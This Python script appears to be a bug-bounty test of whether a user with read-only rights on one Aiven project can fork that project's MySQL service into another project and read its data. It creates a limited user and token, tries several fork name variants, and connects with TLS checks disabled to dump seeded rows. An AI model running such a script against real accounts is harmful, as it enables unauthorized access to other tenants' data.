#!/usr/bin/env python3
"""Aiven run 9: fork authorization test (A6), MySQL lane."""
import json
import os
import re
import subprocess
import sys
import time
import urllib.request
import urllib.error

BASE = "https://api.aiven.io/v1"
T1 = os.environ.get("AIVEN_TOKEN_1", "")
if not T1:
    print("tokens missing", flush=True)
    sys.exit(2)

ORG = "org5eea5b7d496"
SRC = "bugcrowdninja-b1ee"
DST = "moka-fork-target"
SRC_SVC = "moka-seed-my"
CLOUD = "google-europe-west3"
os.makedirs("outputs", exist_ok=True)
CALLS = []


def req(method, path, token, body=None):
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(
        BASE + path, data=data, method=method,
        headers={"Authorization": f"aivenv1 {token}",
                 "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(r, timeout=60) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, f"ERROR {e}"[:200]


def call(who, method, path, token, body=None, keep=500):
    status, resp = req(method, path, token, body)
    safe = re.sub(r'"full_token"\s*:\s*"[^"]+"', '"full_token":"<redacted>"',
                  resp[:keep])
    safe = re.sub(r'"password"\s*:\s*"[^"]+"', '"password":"<redacted>"',
                  safe)
    CALLS.append({"who": who, "method": method, "path": path,
                  "status": status, "len": len(resp), "body": safe})
    print(f"{who} {method} {path} -> {status} ({len(resp)}B)", flush=True)
    return status, resp


def field(text, *names):
    for n in names:
        m = re.search(rf'"{n}"\s*:\s*"([^"]+)"', text or "")
        if m:
            return m.group(1)
    return None


def grant_project(pid, project, perms):
    return call("T1", "PUT",
                f"/organization/{ORG}/permissions/project/{project}",
                T1, {"permissions": [{"principal_id": pid,
                                      "principal_type": "user",
                                      "permissions": perms}]})


def fork_body(name, variant):
    return {"service_type": "mysql", "plan": "hobbyist",
            "service_name": name, "cloud": CLOUD,
            "user_config": {"service_to_fork_from": variant}}


def main():
    s, b = call("T1", "POST", f"/organization/{ORG}/application-users",
                T1, {"name": "moka-fork-f"})
    f_uid = field(b, "user_id")
    print(f"F={f_uid}", flush=True)
    if not f_uid:
        dump()
        return
    grant_project(f_uid, SRC, ["role:project:read"])
    grant_project(f_uid, DST, ["role:project:admin"])
    call("T1", "GET", f"/organization/{ORG}/user/{f_uid}/permissions",
         T1, keep=1200)
    s, b = call("T1", "POST",
                f"/organization/{ORG}/application-users/{f_uid}/access-tokens",
                T1, {"description": "fork-test"})
    ft = field(b, "full_token")
    print(f"F token captured: {bool(ft)}", flush=True)
    if not ft:
        cleanup(f_uid)
        dump()
        return

    call("FT", "POST", f"/project/{SRC}/service", ft,
         {"service_type": "mysql", "plan": "hobbyist",
          "service_name": "moka-should-fail", "cloud": CLOUD})

    variants = [f"{SRC}/{SRC_SVC}", f"{SRC}:{SRC_SVC}", SRC_SVC]
    s, b = call("T1", "POST", f"/project/{DST}/service", T1,
                fork_body("moka-fork-ctl", variants[0]))
    print(f"control fork -> {s} body={b[:220]}", flush=True)
    if s in (200, 201):
        call("T1", "DELETE", f"/project/{DST}/service/moka-fork-ctl", T1)

    fork_name = None
    for i, v in enumerate(variants):
        name = f"moka-fork-f{i+1}"
        s, b = call("FT", "POST", f"/project/{DST}/service", ft,
                    fork_body(name, v))
        print(f"F fork variant {v!r} -> {s} body={b[:220]}", flush=True)
        if s in (200, 201):
            fork_name = name
            break

    if fork_name:
        svc = None
        for i in range(18):
            s, b = call("FT", "GET", f"/project/{DST}/service/{fork_name}",
                        ft, keep=300)
            if s == 200:
                svc = json.loads(b)["service"]
                print(f"poll {i}: state={svc.get('state')}", flush=True)
                if svc.get("state") == "RUNNING":
                    break
            time.sleep(20)
        if svc and svc.get("state") == "RUNNING":
            sup = svc.get("service_uri_params") or {}
            s, b = call("FT", "POST",
                        f"/project/{DST}/service/{fork_name}/user", ft,
                        {"username": "moka_reader"}, keep=300)
            pw = None
            if s in (200, 201):
                u = json.loads(b).get("user") or {}
                pw = u.get("password")
            print(f"reader user pw captured: {bool(pw)}", flush=True)
            if pw:
                subprocess.run([sys.executable, "-m", "pip", "install",
                                "-q", "pymysql"], check=False)
                import ssl as sslmod
                ctx = sslmod.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = sslmod.CERT_NONE
                import pymysql
                try:
                    conn = pymysql.connect(
                        host=sup["host"], port=int(sup["port"]),
                        user="moka_reader", password=pw,
                        database=sup.get("dbname") or "defaultdb", ssl=ctx)
                    cur = conn.cursor()
                    cur.execute("SELECT id, marker FROM moka_seed")
                    rows = cur.fetchall()
                    conn.close()
                    print(f"FORK READ OK rows={rows}", flush=True)
                    with open("outputs/aiven_fork_result.json", "w") as fh:
                        json.dump({"fork": fork_name,
                                   "rows": [list(r) for r in rows]},
                                  fh, indent=1)
                except Exception as e:
                    print(f"fork read failed: {str(e)[:180]}", flush=True)

    cleanup(f_uid)
    dump()


def cleanup(f_uid):
    for n in ("moka-fork-f1", "moka-fork-f2", "moka-fork-f3", "moka-fork-ctl"):
        call("T1", "DELETE", f"/project/{DST}/service/{n}", T1)
    call("T1", "DELETE", f"/project/{SRC}/service/moka-seed-pg2", T1)
    if f_uid:
        call("T1", "DELETE",
             f"/organization/{ORG}/application-users/{f_uid}", T1)


def dump():
    with open("outputs/aiven_fork_calls.json", "w") as fh:
        json.dump({"calls": CALLS}, fh, indent=1)
    print(f"DONE calls={len(CALLS)}", flush=True)


if __name__ == "__main__":
    main()
